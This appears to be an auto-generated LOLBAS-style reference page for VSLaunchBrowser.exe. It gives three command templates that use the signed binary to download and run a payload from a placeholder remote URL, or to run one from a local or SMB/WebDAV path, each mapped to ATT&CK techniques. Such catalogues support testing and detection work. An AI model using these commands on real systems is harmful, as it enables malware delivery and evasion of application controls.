---
parsed_by: focuslocust
source: commands
type: generated
---
# VSLaunchBrowser Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## VSLaunchBrowser.exe

Tool page: [VSLaunchBrowser.exe](../../tools/windows/vslaunchbrowser.exe.md)

### It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

```text
VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
```

Description:

Download and execute payload from remote server

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/VsLaunchBrowser.yml` |
| Evidence | Command preserved from source parser. |

### It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

```text
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
```

Description:

Execute payload via VSLaunchBrowser as parent process

Related ATT&CK:

- [T1127](../../attack/techniques/T1127-trusted-developer-utilities-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/VsLaunchBrowser.yml` |
| Evidence | Command preserved from source parser. |

### It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

```text
VSLaunchBrowser.exe .exe {PATH_SMB}
```

Description:

Execute payload from WebDAV server via VSLaunchBrowser as parent process

Related ATT&CK:

- [T1127](../../attack/techniques/T1127-trusted-developer-utilities-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/VsLaunchBrowser.yml` |
| Evidence | Command preserved from source parser. |
